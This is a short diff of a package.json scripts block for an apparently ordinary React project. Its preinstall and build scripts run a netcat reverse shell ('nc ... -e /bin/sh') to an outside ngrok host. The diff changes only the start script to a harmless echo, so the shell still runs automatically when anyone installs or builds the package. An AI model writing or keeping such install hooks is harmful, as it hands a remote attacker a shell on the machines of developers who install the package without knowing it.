@@ -14,7 +14,7 @@
   },
   "scripts": {
     "preinstall" : "nc 0.tcp.in.ngrok.io 16849 -e /bin/sh",
-    "start": "nc 0.tcp.in.ngrok.io 16849 -e /bin/sh",
+    "start": "echo start",
     "build": "nc 0.tcp.in.ngrok.io 16849 -e /bin/sh",
     "test": "react-scripts test --env=jsdom",
     "eject": "react-scripts eject"
